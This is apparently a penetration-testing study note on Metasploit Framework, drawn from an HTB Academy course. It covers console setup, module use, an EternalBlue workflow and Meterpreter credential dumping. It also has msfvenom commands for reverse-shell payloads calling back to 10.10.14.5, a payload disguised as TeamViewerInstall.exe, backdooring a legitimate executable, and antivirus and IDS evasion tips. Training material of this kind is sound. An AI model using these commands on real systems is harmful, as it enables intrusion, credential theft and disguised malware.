---
title: "Metasploit Framework"
type: tool
tags: [exploitation, htb, linux, network, post-exploitation, tool, web]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-metasploit]
phase: exploit
---

## Purpose

Metasploit Framework is a Ruby-based, modular penetration testing platform that provides a unified environment for finding, exploiting, and post-exploiting vulnerabilities across networks and systems.

## Install / Setup

```bash
sudo apt update && sudo apt install metasploit-framework
```

Start the console:

```bash
msfconsole
msfconsole -q          # quiet mode, no banner
```

Database setup (required for `db_nmap`, `hosts`, `services`, `creds`):

```bash
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb run         # starts postgres and launches msfconsole
```

Verify database connection inside msfconsole:

```bash
msf6 > db_status
```

All base files live in `/usr/share/metasploit-framework/`. The hidden `~/.msf4/` directory stores personal config, session data, and custom modules.

## Core Usage

### Module search and selection

```bash
search eternalblue                              # keyword search
search type:exploit platform:windows cve:2021  # filtered search
search cve:2009 type:exploit platform:-linux    # exclude linux
search type:exploit rank:excellent microsoft    # rank filter
use 0                                           # select by index from last search
use exploit/windows/smb/ms17_010_psexec         # select by full path
info                                            # show module description and references
show options                                    # list all configurable parameters
show targets                                    # list available target OS versions
show payloads                                   # list compatible payloads
show encoders                                   # list compatible encoders
```

### Setting options

```bash
set RHOSTS 10.10.10.40
set LHOST tun0
set LPORT 4444
setg RHOSTS 10.10.10.40     # global (persists across module changes)
setg LHOST tun0
set target 6                # pick specific OS target variant
set payload windows/x64/meterpreter/reverse_tcp
```

### Running exploits

```bash
run                         # alias for exploit
exploit -j                  # run in background as a job
check                       # test exploitability without attacking (if supported)
```

### Sessions and jobs

```bash
sessions                    # list active sessions
sessions -i 1               # interact with session 1
background                  # background current session (or Ctrl+Z)
jobs -l                     # list background jobs
jobs -k 0                   # kill job 0
jobs -K                     # kill all jobs
```

### Multi/handler (catch reverse shells)

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run -j                      # run as background job
```

## Common Use Cases

### Scanning and enumeration

Run Nmap from within msfconsole and save results to the database:

```bash
db_nmap -sV -p- -T5 -A 10.10.10.15
hosts                       # view discovered hosts
services                    # view discovered services
hosts -h                    # help for filtering
services -h
```

Import an existing Nmap XML scan:

```bash
db_import Target.xml
```

### Exploitation workflow (EternalBlue example)

```bash
search ms17_010
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.40
set LHOST tun0
grep meterpreter grep reverse_tcp show payloads
set payload windows/x64/meterpreter/reverse_tcp
run
```

### Post-exploitation with local exploit suggester

```bash
# After obtaining initial shell, background it and run suggester
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Then pick a suggested exploit:

```bash
use exploit/windows/local/ms15_051_client_copy_images
set SESSION 1
set LHOST tun0
run
```

### Meterpreter commands

```bash
# System info
sysinfo                     # hostname, OS, architecture
getuid                      # current user
ps                          # process list

# Privilege escalation
getsystem                   # attempt automatic privilege escalation
steal_token <PID>           # impersonate token from another process
migrate <PID>               # migrate into another process

# File system
pwd                         # print working directory
ls                          # list directory
upload /local/path /remote/path
download /remote/path /local/path
search -f *.txt             # search for files

# Credential dumping
hashdump                    # dump SAM hashes (requires SYSTEM)
lsa_dump_sam                # dump SAM via LSA
lsa_dump_secrets            # dump LSA secrets

# Networking
ipconfig                    # network interfaces
arp                         # ARP cache
route                       # routing table
portfwd add -l 3389 -p 3389 -r 172.16.1.10   # port forward

# Shell
shell                       # drop to OS shell
bg                          # background current session
```

### Database management

```bash
workspace                   # list workspaces
workspace -a Target_1       # add workspace
workspace Target_1          # switch workspace
workspace -d Target_1       # delete workspace
db_export -f xml backup.xml # export database
creds                       # list stored credentials
loot                        # list stored loot (hash dumps, etc.)
```

### Plugins

```bash
load nessus                 # load Nessus bridge plugin
load pentest                # load DarkOperator's pentest plugin
loadpath /usr/share/metasploit-framework/modules/   # load custom module path
reload_all                  # reload all modules after adding new ones
```

## MSFVenom Payload Generation

MSFVenom generates and encodes payloads outside of msfconsole.

```bash
# List payload formats
msfvenom --list formats

# List payloads
msfvenom -l payloads | grep windows

# Windows x64 Meterpreter reverse TCP — EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f exe -o shell.exe

# Windows x86 reverse TCP — ASPX (IIS upload)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=1337 \
  -f aspx > reverse_shell.aspx

# PHP reverse shell
msfvenom -p php/meterpreter_reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f raw > shell.php

# Linux ELF reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f elf > shell.elf

# Encode with Shikata Ga Nai (x86 only), 10 iterations
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o TeamViewerInstall.exe

# Embed payload into a legitimate executable (backdoor)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -x /path/to/legit.exe -k \
  -f exe -o backdoored.exe

# Check payload against VirusTotal
msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe
```

### Staged vs stageless payloads

| Format | Example | Behaviour |
|---|---|---|
| Stageless (single) | `windows/shell_bind_tcp` | Full shellcode in one file; larger but reliable |
| Staged | `windows/shell/bind_tcp` | Small stager fetches stage from listener; smaller initial payload |

Slash notation distinguishes them: `windows/shell/bind_tcp` = staged (stager + stage), `windows/shell_bind_tcp` = stageless.

## IDS/IPS and AV Evasion

- **Encoding**: Multiple iterations of `x86/shikata_ga_nai` reduce detection but do not guarantee bypass against modern AV.
- **Executable templates**: Embedding shellcode into a legitimate executable (`-x`) with `-k` to keep original functionality lowers detection.
- **Archiving**: Double-compressing with password protection and removing the archive extension (`mv test.rar test`) can bypass signature scanning.
- **Packers**: UPX, Enigma Protector, Themida compress and obfuscate executables.
- **AES-encrypted Meterpreter**: MSF6 Meterpreter traffic is AES-encrypted by default, evading network-based IDS/IPS.
- **`--chunked` transfer encoding in HTTP**: Splits POST body so blacklisted keywords cross chunk boundaries.

```bash
# Route MSF traffic through Burp for debugging
use auxiliary/scanner/http/robots_txt
set PROXIES HTTP:127.0.0.1:8080
```

## Tips and Gotchas

- `setg` sets a global option that persists when you switch modules; useful for LHOST/RHOSTS when working a single target.
- `use <no.>` after a search uses the last search index. If you run a new search, indices change.
- Only `Auxiliary`, `Exploit`, and `Post` modules are "interactive" (usable with `use`). Encoders, payloads, NOPs are not.
- When running `exploit -j`, the exploit listener runs as a background job. Use `sessions` and `sessions -i <id>` to interact later.
- `check` does a non-destructive exploitability check where supported; always run it first on production targets.
- Meterpreter sessions can die if the process they injected into terminates. Migrating to a stable process (e.g., `explorer.exe`, `svchost.exe`) improves persistence.
- `getsystem` tries multiple local privilege escalation techniques automatically.
- The local exploit suggester (`post/multi/recon/local_exploit_suggester`) is not 100% accurate; try each suggested module.
- Adding custom `.rb` module files: place them in `/usr/share/metasploit-framework/modules/<type>/<os>/<service>/` using snake_case filenames, then run `reload_all`.
- MSF database requires PostgreSQL running before starting msfconsole; without it you lose `hosts`, `services`, `creds`, `loot`, and `db_nmap`.

## Related Techniques

- [[sql-injection]]
- [[password-attacks]]
- [[linux-privesc]]
- [[pivoting-tunneling]]
- [[ad-enumeration]]
- [[ad-cheatsheet|Active Directory cheatsheet]]
- [[file-transfer]]

## Sources

- CPTS Metasploit Framework module (HTB Academy)
- Source files: `/raw/assets/courses/CPTS/9. Metasploit Framework/`
